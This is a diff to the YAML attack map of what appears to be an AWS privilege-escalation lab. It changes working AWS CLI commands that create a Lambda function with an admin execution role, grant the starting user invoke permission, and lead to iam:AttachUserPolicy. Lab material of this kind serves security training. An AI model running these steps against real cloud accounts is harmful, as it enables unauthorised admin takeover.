@@ -86,7 +86,7 @@ attackMap:
             EOF
             zip /tmp/lambda_payload.zip /tmp/lambda_payload.py
         - description: "Create the Lambda function with the admin execution role"
-          command: "aws lambda create-function --function-name pl-lambda-006-escalation --runtime python3.11 --role arn:aws:iam::{account_id}:role/pl-prod-lambda-006-to-admin-target-role --handler lambda_payload.handler --zip-file fileb:///tmp/lambda_payload.zip"
+          command: "ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text) && aws lambda create-function --function-name pl-lambda-006-escalation --runtime python3.11 --role arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-lambda-006-to-admin-target-role --handler lambda_payload.handler --zip-file fileb:///tmp/lambda_payload.zip"
     - from: starting-user
       to: malicious-lambda
       label: "lambda:AddPermission"
@@ -97,7 +97,7 @@ attackMap:
       hints: []
       commands:
         - description: "Grant the starting user permission to invoke the Lambda function"
-          command: "aws lambda add-permission --function-name pl-lambda-006-escalation --statement-id AllowSelfInvoke --action lambda:InvokeFunction --principal arn:aws:iam::{account_id}:user/pl-prod-lambda-006-to-admin-starting-user"
+          command: "ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text) && aws lambda add-permission --function-name pl-lambda-006-escalation --statement-id AllowSelfInvoke --action lambda:InvokeFunction --principal arn:aws:iam::${ACCOUNT_ID}:user/pl-prod-lambda-006-to-admin-starting-user"
     - from: malicious-lambda
       to: target-role
       label: "lambda:InvokeFunction → iam:AttachUserPolicy"
